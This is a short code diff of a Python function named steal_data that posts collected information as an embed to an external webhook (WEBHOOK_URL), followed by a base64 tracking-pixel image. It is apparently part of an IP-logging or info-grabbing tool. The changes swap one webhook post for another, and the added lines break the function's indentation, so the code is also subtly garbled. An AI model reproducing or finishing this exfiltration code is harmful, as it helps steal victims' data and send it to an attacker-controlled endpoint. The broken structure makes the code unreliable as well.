@@ -143,9 +143,11 @@ def steal_data():
         ]
     }
     
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
-    return info
+    payload = {
+    "embeds": [embed]
+}
+
+r = requests.post(WEBHOOK_URL, json=payload, timeout=5)
 
     
     pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
